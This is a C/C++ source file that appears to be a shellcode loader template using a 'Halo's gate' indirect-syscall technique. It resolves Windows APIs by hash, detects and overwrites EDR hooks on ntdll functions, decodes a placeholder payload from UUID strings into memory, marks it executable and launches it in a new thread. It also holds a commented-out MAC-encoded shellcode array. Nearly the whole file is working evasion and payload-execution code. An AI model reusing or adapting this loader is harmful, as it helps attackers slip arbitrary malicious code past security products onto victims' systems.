/// Halo's gate indirect syscall  (internal version as different from  ASM version)
///
/// Halo's gate modified version

#include <windows.h>
#include <stdio.h>
#include <rpc.h>
#include <winternl.h>
// #include <ip2string.h>
#pragma comment(lib, "ntdll")

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif


typedef struct _DL_EUI48 {
    BYTE Data[6];
} DL_EUI48, *PDL_EUI48;


////////////////////////////Dyamic loading parts:
#include <stdint.h>
#include "processthreadsapi.h"
#include "libloaderapi.h"
#include <winnt.h>
#include <lmcons.h>

#define ADDR unsigned __int64

uint32_t crc32c(const char *s) {
    int      i;
    uint32_t crc=0;
    
    while (*s) {
        crc ^= (uint8_t)(*s++ | 0x20);
        
        for (i=0; i<8; i++) {
            crc = (crc >> 1) ^ (0x82F63B78 * (crc & 1));
        }
    }
    return crc;
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}


namespace dynamic {
    // Dynamically finds the base address of a DLL in memory
    ADDR find_dll_base(const char* dll_name) {
        // Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
        //  and GetModuleHandle which defeats the very purpose of this PoC
        // Well, this is a chicken and egg problem, we have to call those 2 functions stealthly. 
        PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
        PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

        PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        // Iterate through every loaded DLL in the current process
        do {
            PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            char* dllName;
            // Convert unicode buffer into char buffer for the time of the comparison, then free it
            UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
            char* result = strstr(dllName, dll_name);
            CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

            if (result != NULL) {
                // Found the DLL entry in the PEB, return its base address
                return (ADDR)dllEntry->DllBase;
            }
            curr = curr->Flink;
        } while (curr != head);

        return NULL;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function
    ADDR find_dll_export(ADDR dll_base, const char* export_name) {
        // Read the DLL PE header and NT header
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

        // The RVA of the export table if indicated in the PE optional header
        // Read it, and read the export table by adding the RVA to the DLL base address in memory
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        // Browse every export of the DLL. For the i-th export:
        // - The i-th element of the name table contains the export name
        // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (int i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
            if (!_strcmpi(funcName, export_name)) {
                return func_ptr;
            }
        }

        return NULL;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function by hash
    ADDR find_dll_export_by_hash(ADDR dll_base, uint32_t target_hash) {
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (DWORD i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            uint32_t hash = crc32c(funcName);
            if (hash == target_hash) {
                ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
                return func_ptr;
            }
        }

        return NULL; // Function not found
    }


    using LoadLibraryPrototype = HMODULE(WINAPI*)(LPCWSTR);
    LoadLibraryPrototype loadFuture;
    using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
    GetModuleHandlePrototype GetModuleHandle;
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    GetProcAddressPrototype NotGetProcAddress;

    void resolve_imports(void) {

        const char essentialLib[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
        const char EssentialLib[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 };
        const char GetFutureStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
        const char LoadFutureStr[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
        const char GetModuleHandleStr[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
        ADDR kernel32_base = find_dll_base(EssentialLib);
        // Example hashes for critical functions
        uint32_t hash_GetProcAddress = crc32c(GetFutureStr);
        uint32_t hash_LoadLibraryW = crc32c(LoadFutureStr);
        uint32_t hash_GetModuleHandleA = crc32c(GetModuleHandleStr);

        // Resolve functions by hash
        dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(kernel32_base, hash_GetProcAddress);
        dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(kernel32_base, hash_GetModuleHandleA);
        #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(essentialLib), _name))
        dynamic::loadFuture = (LoadLibraryPrototype) _import(LoadFutureStr, LoadLibraryPrototype);    
        // Verify the resolution
        if (dynamic::NotGetProcAddress != NULL && dynamic::loadFuture != NULL && dynamic::GetModuleHandle != NULL) {
            printf("[+] APIs resolved by hash successfully.\n");
        } else {
            printf("[-] Error resolving APIs by hash.\n");
        }

        // dynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base, "GetProcAddress");
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype) find_dll_export(kernel32_base, "GetModuleHandleA");
        // #define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
        // dynamic::loadFuture = (LoadLibraryPrototype) _import("LoadLibraryW", LoadLibraryPrototype);
        printf("[+] LoadLibrary: %p\n", loadFuture);
    }
}
////////////////////////////////////



/////////////////////////////Dyanmic loading ends

///Function not available with MinGW:

NTSTATUS RtlEthernetStringToAddressA(const char* S, const char** Terminator, DL_EUI48* Addr) {
    if (S == NULL || Addr == NULL) return STATUS_INVALID_PARAMETER;

    int values[6];
    if (sscanf(S, "%x-%x-%x-%x-%x-%x%c",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; ++i) {
            Addr->Data[i] = (BYTE)values[i];
        }
        if (Terminator) *Terminator = S + 17; // Point to the end (or next character) after the MAC address
        return STATUS_SUCCESS;
    }
    return STATUS_INVALID_PARAMETER;
}


// Function to convert a block of 16 bytes to a UUID-like string
void bytesToUuidString(const unsigned char *bytes, char *uuidString) {
    sprintf(uuidString,
            "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
            bytes[3], bytes[2], bytes[1], bytes[0],
            bytes[5], bytes[4], bytes[7], bytes[6],
            bytes[8], bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]);
}

void convertToUuids(unsigned char *magiccode, int magiccodeLength, char uuids[][37]) {
    int uuidIndex = 0;
    for (int i = 0; i < magiccodeLength; i += 16) {
        bytesToUuidString(magiccode + i, uuids[uuidIndex++]);
    }
}


// Define a structure to hold the binary form of a UUID
typedef struct _UUID_BINARY {
    BYTE Data[16];
} UUID_BINARY, *PUUID_BINARY;

NTSTATUS RtlUuidStringToBinary(const char* S, PUUID_BINARY Addr) {
    if (S == NULL || Addr == NULL) return STATUS_INVALID_PARAMETER;

    unsigned int values[16];
    int parsed = sscanf(S, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
                        &values[3], &values[2], &values[1], &values[0],
                        &values[5], &values[4], &values[7], &values[6],
                        &values[8], &values[9], &values[10], &values[11],
                        &values[12], &values[13], &values[14], &values[15]);
    
    if (parsed != 16) {
        return STATUS_INVALID_PARAMETER;
    }

    // Correct for endianness and store in Addr
    for (int i = 0; i < 16; i++) {
        Addr->Data[i] = (BYTE)values[i];
    }

    return STATUS_SUCCESS;
}



#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define UP -32
#define DOWN 32

// Define function pointer types for the NT functions
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer);

typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten);

// Declare global function pointers
pNtAllocateVirtualMemory myNtAllocateVirtualMemory = NULL;
pNtProtectVirtualMemory myNtProtectVirtualMemory = NULL;
pNtCreateThreadEx myNtCreateThreadEx = NULL;
pNtWaitForSingleObject myNtWaitForSingleObject = NULL;
pNtWriteVirtualMemory myNtWriteVirtualMemory = NULL;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};



///////////////////////////////////// 

// const char* MAC[] =
// {
//     "FC-48-83-E4-F0-E8",
//     "C0-00-00-00-41-51",
//     "41-50-52-51-56-48",
//     "31-D2-65-48-8B-52",
//     "60-48-8B-52-18-48",
//     "8B-52-20-48-8B-72",
//     "50-48-0F-B7-4A-4A",
//     "4D-31-C9-48-31-C0",
//     "AC-3C-61-7C-02-2C",
//     "20-41-C1-C9-0D-41",
//     "01-C1-E2-ED-52-41",
//     "51-48-8B-52-20-8B",
//     "42-3C-48-01-D0-8B",
//     "80-88-00-00-00-48",
//     "85-C0-74-67-48-01",
//     "D0-50-8B-48-18-44",
//     "8B-40-20-49-01-D0",
//     "E3-56-48-FF-C9-41",
//     "8B-34-88-48-01-D6",
//     "4D-31-C9-48-31-C0",
//     "AC-41-C1-C9-0D-41",
//     "01-C1-38-E0-75-F1",
//     "4C-03-4C-24-08-45",
//     "39-D1-75-D8-58-44",
//     "8B-40-24-49-01-D0",
//     "66-41-8B-0C-48-44",
//     "8B-40-1C-49-01-D0",
//     "41-8B-04-88-48-01",
//     "D0-41-58-41-58-5E",
//     "59-5A-41-58-41-59",
//     "41-5A-48-83-EC-20",
//     "41-52-FF-E0-58-41",
//     "59-5A-48-8B-12-E9",
//     "57-FF-FF-FF-5D-48",
//     "BA-01-00-00-00-00",
//     "00-00-00-48-8D-8D",
//     "01-01-00-00-41-BA",
//     "31-8B-6F-87-FF-D5",
//     "BB-E0-1D-2A-0A-41",
//     "BA-A6-95-BD-9D-FF",
//     "D5-48-83-C4-28-3C",
//     "06-7C-0A-80-FB-E0",
//     "75-05-BB-47-13-72",
//     "6F-6A-00-59-41-89",
//     "DA-FF-D5-63-61-6C",
//     "63-2E-65-78-65-00",
// };

unsigned char magiccode[] = ####SHELLCODE####;


    const char* MAC[] = {

    };

BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    if (memcmp(addr, stub, 4) != 0) 
        return TRUE;
    return FALSE;
}

// Halo's gate syscall
WORD GetsyscallNum(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP
    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);

                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}

DWORD64 GetsyscallInstr(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // syscall

    }

    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {

                return (INT_PTR)addr + 0x12;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {

                return (INT_PTR)addr + 0x12;

            }

        }

    }

}

/// This part can be replaced with ASM stubs to avoid static signature. 
BOOL UnhookPatch(LPVOID addr) {

    DWORD oldprotect = 0;
   
    BYTE syscallNum = GetsyscallNum(addr);
    DWORD64 syscallInst = GetsyscallInstr(addr);
    
    // mov     r10, rcx        
    // mov     eax, SSN
    // syscall
    // retn

    BYTE patch[] = { 0x49, 0x89, 0xCA, 0xB8, 0xBC, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90, 0x90, 0x90, 0x90 };

    // syscall
    patch[4] = syscallNum;

    // syscall instruction
    patch[8] = *(BYTE*)syscallInst;
    patch[9] = *(BYTE*)(syscallInst + 0x1);

    BOOL status1 = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status1) {
        printf("Failed in changing protection (%u)\n", GetLastError());
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));


    BOOL status2 = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
    if (!status2) {
        printf("Failed in changing protection back (%u)\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main() {

   
    // dynamic load:
    /***
     * Only allocate memory is implemented with dynamic invisible loading, other functions remain in EAT
     * For the readers to the the rest... It is easy, just replace the normal dynamic loading with custom ones.
    */
    const wchar_t essentialLibW[] = { L'n', L't', L'd', L'l', L'l', 0 };
    dynamic::resolve_imports();
    HMODULE hNtdll = dynamic::loadFuture(essentialLibW);
    if (hNtdll == NULL) {
        printf("Failed to load ntdll.dll\n");
        return 1;
    }

    PVOID BaseAddress = NULL;
    // SIZE_T dwSize = 0x2000;
    // Calculate the total size of the shellcode
    //MAC: 
    // int numShellcodeEntries = sizeof(MAC) / sizeof(MAC[0]);
    // SIZE_T dwSize = numShellcodeEntries * 6; // Each entry is 6 bytes
    // UUID and Classic: 
    SIZE_T dwSize = sizeof(magiccode);

    const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
    const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };

    myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)dynamic::NotGetProcAddress(hNtdll, NtAlloc);
    // myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);

    if (!myNtAllocateVirtualMemory) {
        printf("Failed to get address for NtAllocateVirtualMemory\n");
        return 1; // Or appropriate error handling
    }



    // if (isItHooked(myNtAllocateVirtualMemory)) {
    if (isItHooked(reinterpret_cast<LPVOID>(myNtAllocateVirtualMemory))) {
        printf("[-] NtAllocateVirtualMemory Hooked\n");
        if (!UnhookPatch((LPVOID)(uintptr_t)myNtAllocateVirtualMemory)) {
        // if (!UnhookPatch(myNtAllocateVirtualMemory)) {
            printf("Failed in Unhooking NtCreateThreadEx\n");
        }
        printf("\t[+] NtCreateThreadEx UnHooked\n");
    }
    else {
        printf("[+] NtAllocateVirtualMemory Not Hooked\n");
    }
    



    NTSTATUS status1 = myNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in myNtAllocateVirtualMemory (%u)\n", GetLastError());
        return 1;
    }

    //////////////////////////////////////////////////////////////////
    ///// Write to memory: 

    //// MAC Format: 
    // int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    // PCSTR Terminator = NULL;
    // NTSTATUS STATUS;

    // DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    // for (int i = 0; i < rowLen; i++) {
    //     STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
    //     if (!NT_SUCCESS(STATUS)) {
    //         return FALSE;
    //     }
    //     ptr += 6;

    // }

    // UUDI Format: 
    int magiccodeLength = sizeof(magiccode); // Assume magiccode is defined elsewhere
    int numUuids = (magiccodeLength + 15) / 16; // Calculate the number of UUIDs needed
    // int numUuids = sizeof(uuids) / sizeof(uuids[0]); // alternative way to calculate no. of UUIDs 

    // Allocate memory for UUID strings
    char(*uuids)[37] = new char[numUuids][37]; 

    // Convert magiccode to UUIDs
    convertToUuids(magiccode, magiccodeLength, uuids);

    UUID_BINARY* Addr = (UUID_BINARY*)BaseAddress; // Cast BaseAddress to UUID_BINARY pointer for direct access

    for (int i = 0; i < numUuids; i++) {
        NTSTATUS status = RtlUuidStringToBinary(uuids[i], Addr + i);
        if (!NT_SUCCESS(status)) {
            // Handle error, possibly clean up and exit
            return FALSE;
        }
    }


/// Traditional write: 
    // const char NtWrite[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
    // myNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA(ntdll), NtWrite);
    // if(!myNtWriteVirtualMemory) {
    //     printf("Failed to get address for NtWriteVirtualMemory\n");
    //     return 1; // Or appropriate error handling
    // }
    // if(isItHooked(reinterpret_cast<LPVOID>(myNtWriteVirtualMemory))) {
    //     printf("[-] NtWriteVirtualMemory Hooked\n");
    //     if (!UnhookPatch((LPVOID)(uintptr_t)myNtWriteVirtualMemory)) {
    //         printf("Failed in Unhooking NtWriteVirtualMemory\n");
    //     }
    //     printf("\t[+] NtWriteVirtualMemory UnHooked\n");
    // }
    // else {
    //     printf("[+] NtWriteVirtualMemory Not Hooked\n");
    // }

    // NTSTATUS status2 = myNtWriteVirtualMemory(NtCurrentProcess(), BaseAddress, magiccode, dwSize, NULL);
    // if(!NT_SUCCESS(status2)) {
    //     printf("[!] Failed in myNtWriteVirtualMemory (%u)\n", GetLastError());
    //     return 1;
    // }

//////////////////////////////////// Write ends://///////////////////
    HANDLE hThread;
    DWORD OldProtect = 0;


    const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };

    myNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA(ntdll), NtProtect);
    // LPVOID pNtProtect = (LPVOID)GetProcAddress(GetModuleHandleA(ntdll), NtProtect);
    // use the passing structure in the previous function to check:
    if (isItHooked(reinterpret_cast<LPVOID>(myNtProtectVirtualMemory))) {
        printf("[-] NtProtectVirtualMemory Hooked\n");
        if (!UnhookPatch((LPVOID)(uintptr_t)myNtProtectVirtualMemory)) {
        // if (!UnhookPatch(pNtProtect)) {
            printf("Failed in Unhooking NtCreateThreadEx\n");
        }
        printf("\t[+] NtCreateThreadEx UnHooked\n");
    }
    else {
        printf("[+] NtProtectVirtualMemory Not Hooked\n");
    }
    

    NTSTATUS NtProtectStatus1 = myNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Failed in myNtProtectVirtualMemory (%u)\n", GetLastError());
        return 2;
    }


    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    const char NtCreateTh[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };

    myNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA(ntdll), NtCreateTh);
    if(isItHooked(reinterpret_cast<LPVOID>(myNtCreateThreadEx))) {
        printf("[-] NtCreateThreadEx Hooked\n");
        if (!UnhookPatch((LPVOID)(uintptr_t)myNtCreateThreadEx)) {
            printf("Failed in Unhooking NtCreateThreadEx\n");
        }
        printf("\t[+] NtCreateThreadEx UnHooked\n");
        
    }
    else {
        printf("[+] NtCreateThreadEx Not Hooked\n");
    }

    // if (isItHooked(pNtCreateThreadEx)) {
    //     printf("[-] NtCreateThreadEx Hooked\n");
    //     if (!UnhookPatch(pNtCreateThreadEx)) {
    //         printf("Failed in Unhooking NtCreateThreadEx\n");
    //     }
    //     printf("\t[+] NtCreateThreadEx UnHooked\n");
        
    // }
    // else {
    //     printf("[+] NtCreateThreadEx Not Hooked\n");
    // }


    // NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    NTSTATUS NtCreateThreadstatus = myNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (PVOID)BaseAddress, NULL, FALSE, 0, 0, 0, NULL);

    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in myNtCreateThreadEx (%u)\n", GetLastError());
        return 3;
    }



    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -99990000;

    const char NtWait[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0 };

    myNtWaitForSingleObject = (pNtWaitForSingleObject)GetProcAddress(GetModuleHandleA(ntdll), NtWait);
    // LPVOID pNtWait = (LPVOID)GetProcAddress(GetModuleHandleA(ntdll), NtWait);

    if(isItHooked(reinterpret_cast<LPVOID>(myNtWaitForSingleObject))) {
        printf("[-] NtWaitForSingleObject Hooked\n");
        if (!UnhookPatch((LPVOID)(uintptr_t)myNtWaitForSingleObject)) {
            printf("Failed in Unhooking NtWaitForSingleObject\n");
        }
        printf("\t[+] NtWaitForSingleObject UnHooked\n");
    }
    else {
        printf("[+] NtWaitForSingleObject Not Hooked\n");
    }


    NTSTATUS NTWFSOstatus = myNtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in myNtWaitForSingleObject (%u)\n", GetLastError());
        return 4;
    }

    printf("[+] Mission Complete. \n");

    return 0;

}